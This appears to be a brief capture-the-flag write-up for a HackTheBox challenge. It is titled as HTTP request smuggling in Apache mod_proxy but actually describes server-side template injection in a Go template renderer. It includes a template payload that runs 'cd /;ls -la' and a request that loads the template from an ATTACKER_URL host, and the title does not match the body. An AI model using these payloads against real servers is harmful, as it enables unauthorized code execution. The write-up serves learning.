# HTML Request Smuggling > Apache Mod_Proxy 

## Website 

<img src= "apacheblaze_website.PNG">

## Description

So, the functionality of the application seems to load and render templates either locally or remotely, depending on the ?use_remote={true/false} parameter. This lead me to want to check for SSTI vulnerability. After reviewing the source code provided by HackTheBox, we know it is using the Go templating language. I was able to set up a test.go template on my server with the contents {{.FetchServerInfo "cd /;ls -la"}}. Once the server loaded and executed my template code, I recieved the contents of the / directory, revealing code execution Just for context this is a CTF. What type of vulnerabilities were displayed here?.

## Set Up

1. Burpsuite Repeater/collaborator(Testing): GET requests to /render?use_remote=true&page=https://ATTACKER_URL/test.go.

## Exploit
<img src= "exploited_html_)smuggling.PNG">

## More Information

[CVE-2023-25690-POC](https://github.com/dhmosfunk/CVE-2023-25690-POC/tree/main#internal-http-request-smuggling-via-header-injection)
<summary> The impact of this vulnerability is that it allows attackers to target and access internal applications that are meant to be hidden by the reverse proxy, potentially leading to unauthorized access, data leakage, or further exploitation.</summary>
